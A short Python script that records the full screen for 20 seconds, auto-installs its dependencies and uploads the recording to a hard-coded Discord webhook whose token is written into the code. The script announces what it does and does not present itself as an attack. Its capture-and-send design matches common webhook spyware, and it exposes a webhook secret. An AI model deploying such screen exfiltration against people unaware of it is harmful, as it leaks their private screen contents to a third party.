import subprocess
import sys
import time
import io
import pyautogui
import cv2
import numpy as np
import requests
from datetime import datetime

def install_packages():
    """Install required packages."""
    requirements = [
        'pyautogui',
        'opencv-python',
        'requests'
    ]
    for package in requirements:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def upload_video_to_discord(video_path):
    """Upload the video file to Discord via webhook."""
    webhook_url = 'https://discord.com/api/webhooks/1268235871740624977/T4pFfcwPV3L8dZVIQ4FqVzJOTClnyPtxkr20A8iYOz7GVzlkOsTKhwoSy63ij848tZOM'
    with open(video_path, 'rb') as video_file:
        files = {'file': ('recording.avi', video_file, 'video/x-msvideo')}
        response = requests.post(webhook_url, files=files)
    if response.status_code == 204:
        print("Video successfully uploaded to Discord.")
    else:
        print(f"Failed to upload video to Discord. Status code: {response.status_code}")

def record_screen(duration=20):
    """Record the screen for a given duration in seconds."""
    # Define the screen size
    screen_size = pyautogui.size()
    width, height = screen_size.width, screen_size.height

    # Define the codec and create a VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_path = 'screen_recording.avi'
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (width, height))

    print(f"Recording for {duration} seconds... Press Ctrl+C to stop.")

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            # Take a screenshot
            img = pyautogui.screenshot()

            # Convert the image to a format suitable for OpenCV
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            # Write the frame to the video file
            out.write(frame)

            # Wait for a short while before capturing the next frame
            time.sleep(0.05)  # Adjust the sleep time as needed
    except KeyboardInterrupt:
        print("Recording stopped.")

    # Release everything when the recording is done
    out.release()
    cv2.destroyAllWindows()

    return video_path

def main():
    try:
        import pyautogui
        import cv2
        import numpy as np
        import requests
    except ImportError:
        print("Required packages are not installed. Installing...")
        install_packages()
        import pyautogui
        import cv2
        import numpy as np
        import requests

    # Record the screen for 20 seconds
    video_path = record_screen(duration=20)

    # Upload the recorded video to Discord
    upload_video_to_discord(video_path)

if __name__ == "__main__":
    main()
